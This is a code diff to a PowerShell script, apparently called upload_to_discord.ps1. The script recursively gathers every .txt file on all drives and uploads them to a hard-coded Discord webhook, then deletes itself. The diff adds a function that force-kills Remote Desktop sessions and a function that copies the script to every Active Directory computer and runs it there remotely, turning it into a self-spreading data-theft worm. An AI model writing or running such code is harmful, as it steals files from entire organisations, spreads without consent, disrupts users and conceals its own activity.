@@ -1,5 +1,10 @@
-# Discord webhook URL
-$webhookUrl = "https://discord.com/api/webhooks/1243581518152990801/HeVZuyvWfQSYBl1ipXcbIEb2uIScSwlrXj6lazDoujaA741SdO4idCw8nhchRScTwinE"
+# Function to close any active Remote Desktop connections
+function Close-RemoteDesktopConnections {
+    $rdpProcesses = Get-Process -Name mstsc -ErrorAction SilentlyContinue
+    foreach ($process in $rdpProcesses) {
+        Stop-Process -Id $process.Id -Force
+    }
+}
 
 # Function to upload file to Discord webhook
 function Upload-FileToDiscord {
@@ -44,13 +49,41 @@ function Upload-FileToDiscord {
     $webResponse.Close()
 }
 
+# Function to replicate the script to other computers
+function Replicate-Script {
+    param (
+        [string]$scriptPath,
+        [string]$webhookUrl
+    )
+
+    $computers = Get-ADComputer -Filter * | Select-Object -ExpandProperty Name
+    foreach ($computer in $computers) {
+        try {
+            Copy-Item -Path $scriptPath -Destination "\\$computer\C$\Windows\Temp\" -Force
+            Invoke-Command -ComputerName $computer -ScriptBlock {
+                param ($scriptPath, $webhookUrl)
+                . $scriptPath -webhookUrl $webhookUrl
+            } -ArgumentList "\\$computer\C$\Windows\Temp\upload_to_discord.ps1", $webhookUrl
+        } catch {
+            Write-Host "Failed to replicate to $computer"
+        }
+    }
+}
+
+# Close any active Remote Desktop connections
+Close-RemoteDesktopConnections
+
 # Recursively get all .txt files from all drives
+$webhookUrl = "https://discord.com/api/webhooks/1243581518152990801/HeVZuyvWfQSYBl1ipXcbIEb2uIScSwlrXj6lazDoujaA741SdO4idCw8nhchRScTwinE"
 $drives = Get-PSDrive -PSProvider FileSystem
 foreach ($drive in $drives) {
     Get-ChildItem -Path $drive.Root -Filter *.txt -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
         Upload-FileToDiscord -filePath $_.FullName -webhookUrl $webhookUrl
     }
 }
+
+# Replicate the script to other computers
+Replicate-Script -scriptPath $MyInvocation.MyCommand.Definition -webhookUrl $webhookUrl
 
 # Remove the PowerShell script file after execution
 $scriptPath = $MyInvocation.MyCommand.Definition
